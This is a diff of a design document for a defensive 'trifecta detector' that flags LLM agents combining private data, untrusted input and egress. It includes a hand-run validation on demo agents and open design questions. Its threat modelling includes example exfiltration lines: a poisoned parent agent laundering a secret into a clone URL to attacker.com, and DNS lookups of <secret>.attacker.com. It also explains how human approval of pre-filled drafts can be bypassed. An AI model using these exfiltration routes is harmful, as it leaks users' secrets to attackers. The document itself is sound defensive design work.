@@ -1,10 +1,25 @@
 # Trifecta detector
 
-Status: **designed, not built.** Algorithm is settled (this file);
-two parts still open (human-gated-egress primitive; how/where to
-surface it in docs + example scripts). This file is the staging
-area — as pieces land in source or in `book/`, cut them from
-here so what remains is always "not yet done."
+Status: **designed, not built.** Core algorithm is essentially settled
+(this file); a paper dry-run on the demos (see "Paper dry-run" below)
+validated the verdicts but the open-questions pile is *growing*, not
+shrinking. Parked threads, none pursued yet:
+
+1. The human-gated-egress primitive (author-seat half shipped; taint half
+   designed-not-built).
+2. Does a *local file read* carry `:untrusted`? — the tag table and the
+   narrative disagree (a genuine gap in the "settled" rules).
+3. `:egress_writeonly` (the `web_search` write-only insight as a tag) —
+   deferred; inert until a search-only persona exists.
+4. `git_clone` as a readable egress verb + the per-agent **poisoned**
+   assumption question (may already be the untrusted-strength lattice).
+5. `:egress_human_gated` — reopened as *load-bearing* (the only route to a
+   "trifecta-safe" pikuri-computer); likely author-vs-approver two-strength,
+   not one tag.
+6. How/where to surface all of this in docs + example scripts.
+
+This file is the staging area — as pieces land in source or in `book/`,
+cut them from here so what remains is always "not yet done."
 
 Related, already in the repo:
 
@@ -346,6 +361,230 @@ Two pikuri-os specifics that sharpen this:
   residual hole as the pre-fill gap above, stated as a security bound:
   the strong "stops any egress" claim needs the human in **author**
   mode, which the current chrome invites but does not enforce.
+
+## Paper dry-run: running the algorithm by hand on the demos
+
+Validation before there's code. Tags assigned by the rules above from
+the *actual* wiring in `pikuri-os/bin/pikuri-computer`,
+`pikuri-os/bin/pikuri-os` and `pikuri-code/bin/pikuri-code` (checked
+2026-07). `:private` is treated as **declared** where the workspace is
+obviously sensitive and **undeclared** where it isn't — the whole point
+of the user-supplied leg — and both readings are shown where it flips
+the verdict.
+
+Working assumptions the dry-run had to pin down (each is an open design
+question below, not settled fact):
+
+- **Local file reads carry hard `:untrusted`** on any workspace that can
+  hold non-user-authored bytes (a cloned dep, a saved attachment, a PR
+  branch). Every workspace here qualifies. This is the "tag generously"
+  rule applied to the *untrusted* leg, mirroring how `:egress` is
+  tagged.
+- **A human-gated hand-off is still hard `:egress`.** Thunderbird's
+  compose / calendar-create stage bytes bound for an attacker-readable
+  sink (the recipient's inbox); the human *Send* is a runtime
+  mitigation the capability check can't see. Capability present → tag it.
+
+### Results
+
+| binary / mode | parent's final tag set | verdict | the leg that decides it |
+|---|---|---|---|
+| **pikuri-computer**, default (internet ON) | `{private, untrusted(hard), egress}` | **loud** | Thunderbird compose = direct egress; mail = hard untrusted; disk = private |
+| **pikuri-computer**, `--no-internet` | `{private, untrusted(hard), egress}` | **loud** | *unchanged* — egress is Thunderbird compose, not the web tools |
+| **pikuri-code**, default, **public** repo (no `:private`) | `{untrusted(hard), egress}` | **silent** | private leg never declared → two legs only |
+| **pikuri-code**, default, **private** repo (`:private` declared) | `{private, untrusted(hard), egress}` | **loud** | bash (Bubblewrap `--share-net`) = direct egress; repo = private + untrusted |
+
+Per-node detail (the max-over-tree the report would attribute):
+
+- **pikuri-computer** — the *parent itself* is a full hard trifecta;
+  it never needs the RESEARCHER path. Disk (`AllowAll denylist: []`,
+  whole host incl. `~/.ssh`) + Thunderbird mail give private+untrusted
+  directly; Thunderbird compose gives egress directly. RESEARCHER adds
+  `egress` (propagated full) + `untrusted_weakened` — both already
+  dominated. Verdict **loud, attributed to the parent node**. The
+  internet toggle is **verdict-neutral**: dropping the researcher
+  removes only redundant legs.
+- **pikuri-code** — the parent holds **direct** egress via bash, because
+  Bubblewrap keeps `--share-net` (needed for `gem`/`bundle`/`mvn`/`pip`).
+  So the sub-agent quarantine of the web tools does **not** remove the
+  parent's egress leg here — it only keeps *untrusted web content* out of
+  the parent's context. The one lever left is `:private`: undeclared over
+  a public repo → silent; declared over your real work repo → loud. This
+  is exactly the "why the default is quiet" story, made concrete.
+  RESEARCHER / FILE_MINER / GIT_REPO_RESEARCHER nodes each miss a leg
+  (no private; FILE_MINER has no egress) → none fires on its own.
+
+### Three findings the dry-run forces
+
+1. **The two agents differ on *where* egress lives, and it matters.**
+   pikuri-os/computer sever bash at the kernel (`--unshare-net`), so the
+   parent's only machine-egress is the *propagated* researcher leg — which
+   is why privilege separation is load-bearing there. pikuri-code shares
+   the network in bash, so the parent egresses directly and separation
+   buys context-hygiene, not an egress break. A reader could easily
+   believe "web tools live on the sub-agent ⇒ the parent can't egress";
+   for pikuri-code that's **false**. The detector surfaces this because it
+   tags bash's egress from the sandbox's actual net posture, not from
+   which tools are nominally "network tools."
+
+2. **pikuri-computer — the flagship 'reassembled trifecta done safely'
+   demo — trips the loudest alarm, in *both* modes.** That's correct, not
+   a bug: it *is* a full trifecta; the safety is the human commit in
+   Thunderbird's UI + the kernel-severed bash + the approved researcher
+   task, none of which is leg-*absence*. This is the single best teaching
+   case for "smoke alarm, not firewall": the most carefully-defended demo
+   is the one that rings, because defense-by-human-gate is invisible to a
+   capability-presence check. Consequence for the message: the once-per-
+   process line here must name the gate ("egress is human-gated via
+   Thunderbird / the approved researcher task — that gate is your
+   firewall; verify each draft's recipient + body"), or it reads as an
+   unfixable false alarm and gets muted.
+
+3. **`:private` being undeclared is the *only* thing keeping pikuri-code
+   quiet**, and pikuri-code has **no networkless mode** to fall back on
+   (Bubblewrap can't `--unshare-net` and still install toolchains). So the
+   `:private` declaration isn't a nicety — for the coding agent it's the
+   sole lever between silent and loud. That raises the priority of the
+   unbuilt `Filesystem(private: true)` plumbing: without it the coding
+   agent can never *earn* the warning it should get over a secret repo.
+
+### Open design questions this exposed
+
+- **Is a local file read `:untrusted`, and who defaults it?** The tag
+  table (only web + web-sourced vectordb) says *no*; the pikuri-os
+  narrative ("the moment it reads a hard-`:untrusted` local file") says
+  *yes*. The dry-run needs it to be *yes* to get the right verdicts.
+  Resolve the table toward: **file-read tools default `:untrusted` unless
+  the workspace is declared all-trusted** — the untrusted-leg twin of
+  "tag egress generously." (An all-trusted-workspace opt-out is the
+  symmetric knob to `private: true`.)
+- **Does a human-gated hand-off deserve its own marker?** This is now a
+  live open question, not a lean — see "More open questions (b)" below,
+  where it's reopened as *load-bearing* (the user's position: without it
+  pikuri-computer can never be classified as anything but a full
+  trifecta, and the book leans on the softer framing).
+
+## Proposed tag `:egress_writeonly` (the `:egress_untargeted` idea)
+
+The proposal: `web_search` is egress, but the attacker can't *read back*
+what leaked — the query goes to a pikuri-picked engine, write-only from
+the attacker's view. So an agent whose only egress is search is safer
+than one that can `fetch` an attacker-chosen URL.
+
+**The insight is correct and already load-bearing** — it's the
+`web_search`-vs-`fetch` distinction in the pikuri-os section above
+(query → pikuri-picked engine, unreadable; `fetch` host →
+attacker-controlled, readable). Worth promoting from prose to a concept.
+Notes on doing it well:
+
+- **Name it for what it defends, not the mechanism.** "Untargeted" is
+  slightly wrong: the attacker *does* target the content (the secret
+  rides in the query string) — what they can't do is **read the
+  response**. `:egress_writeonly` / `:egress_blind` says the actual
+  property. The naming test also correctly **excludes DNS**: a lookup of
+  `<secret>.attacker.com` is query-shaped but the hostname is fully
+  readable at the attacker's nameserver → stays hard `:egress`. "It's
+  just a query, unreadable" is the exact trap the note's "egress is
+  broader than web_search" warns about; the write-only bucket must be an
+  **opt-in allowlist per known-safe sink, never a default** (unknown
+  egress stays hard).
+- **Precise definition.** Write-only iff the attacker controls neither
+  the destination host nor can read the response body, **and** the
+  request is not attacker-readable in flight or at rest (excludes DNS;
+  excludes a search whose engine the attacker chose/compromised).
+- **Lattice + union.** Treat it as a *soft* egress, twin of
+  `untrusted_weakened`: `none < egress_writeonly < egress`, union = max.
+  `{private, untrusted, egress_writeonly}` → **soft notice** (secret can
+  be pushed out but not retrieved — a real, large reduction, matching the
+  "not 'any'" bound on patient approval); any readable egress present →
+  `egress_writeonly ⊔ egress = egress` → loud. This is the correct
+  guard against the drip / existence-oracle channel: write-only search is
+  only safe as the **sole** egress leg — the moment a second readable
+  action exists, results-that-depend-on-the-secret become a targeting
+  stage and it's hard again.
+- **It changes no current verdict, so defer the tag.** Every persona that
+  holds `web_search` (`RESEARCHER`, `GIT_REPO_RESEARCHER`) *also* holds
+  `fetch` + `web_scrape` → hard egress dominates; there is no search-only
+  agent in the tree today. The tag only earns its keep paired with a
+  **search-only researcher persona** (drop `fetch`/`web_scrape`), at which
+  point the soft verdict becomes reachable and meaningful. Ship them
+  together or not at all. Filed as a deferred idea, not v1.
+
+## More open questions (documented, NOT pursued — revisit later)
+
+Two threads raised after the dry-run. Both are parked deliberately; the
+value here is that each turns out to touch machinery the note *already*
+has, so the notes below are leads for whoever picks this up, not
+decisions.
+
+### (a) `git_clone` is a readable egress verb — and the "poisoned agent" question behind it
+
+Concrete hole: a poisoned parent can launder a secret into a clone URL —
+`agent(git_repo_researcher, "clone https://attacker.com/?q=<SECRET>")`.
+The clone *host* is attacker-chosen and the request reaches it, so
+`git_clone` is a **readable** egress verb, same family as `fetch` — **not**
+a candidate for the `:egress_writeonly` bucket. (This doesn't change the
+dry-run verdicts: `GIT_REPO_RESEARCHER` still holds no `:private`, so its
+node doesn't fire, and its propagated `:egress` was already dominated. It
+*does* mean the "harmless" framing of that persona is only true because it
+lacks private data, never because its egress is bounded.)
+
+The channel itself — parent launders private data into a sub-agent task
+string — is **already modelled**: it's exactly why `:egress` propagates up
+at full strength ("the parent can just *ask* the egress sub-agent to send
+the thing"). So the narrow answer is "already covered."
+
+The deeper question the user raised: **should severity carry a per-agent
+`poisoned` assumption?** The propagation model today implicitly assumes the
+parent is drivable (it will faithfully relay/launder) — true for
+**pikuri-computer** (parent reads attacker email on day 1) but pessimistic
+for **pikuri-assistant** (architected to keep the parent pristine, untrusted
+reaching it only as sub-agent summaries). A `poisoned: true|false` flag
+could make the two analyses differ.
+
+Lead worth examining before adding any flag: **this axis may already be the
+`untrusted` vs `untrusted_weakened` strength**, not a new flag. A parent
+holding *hard* `:untrusted` (reads attacker content directly) is
+"poisoned-capable"; one holding only `:untrusted_weakened` (untrusted via a
+sub-agent) is "resists poisoning." If so, the soft/loud split *already*
+encodes poisoned-vs-pristine and a separate `poisoned` flag would be
+redundant. Unverified — the job for future-me is to check whether that
+mapping holds in every case or whether there's a scenario the strength
+lattice can't express. Only add the flag if the mapping breaks.
+
+### (b) `:egress_human_gated` — reopened as load-bearing
+
+Earlier draft leaned *against* a human-gated egress marker (it looked like
+the "trust the approver" mistake). **Reopened**: the user considers it
+load-bearing precisely *because* it softens pikuri-computer — without some
+such distinction, pikuri-computer is permanently a full hard trifecta and
+there is **no wiring that makes it "trifecta-safe."** The book already
+presents the human gate as the thing that makes the reassembled trifecta
+safe, so the detector calling it a flat loud trifecta contradicts the
+teaching.
+
+Both positions, kept for the revisit:
+
+- **For the marker:** a demo whose entire safety story is the human gate
+  should be classifiable as *mitigated*, not lumped with an autonomous-exfil
+  agent. A verdict that can never improve no matter how you wire it is a
+  verdict people mute.
+- **Against (the earlier concern):** a blanket "human-gated ⇒ soft" repeats
+  the rejected trust-the-approver reasoning — a laundered/encoded email a
+  human rubber-stamps still exfiltrates.
+
+The reconciling lead (do not build, just recorded): the note **already**
+splits human-in-the-loop into **author** (rewrites → clean by construction)
+vs **approver** (inspects a pre-fill → leaky), and shows patient approval
+closes only the easy channel, not the covert/drip one. So any
+`:egress_human_gated` softening is only as strong as the *author* reading —
+it must not soften an approve-by-default pre-fill. And pikuri-computer's
+Thunderbird compose is exactly the knife-edge case: the LLM drafts, the
+human reviews a **pre-filled** compose window and hits Send — author-*capable*
+but approve-*by-default*, the same residual hole as the pikuri-os task gate.
+So the honest shape of the marker is probably not one tag but two strengths
+(author-gated vs approver-gated), mirroring the untrusted lattice — and
+that's the thing to work out when this is picked up.
 
 ## Open: propagating this to docs + example scripts
 
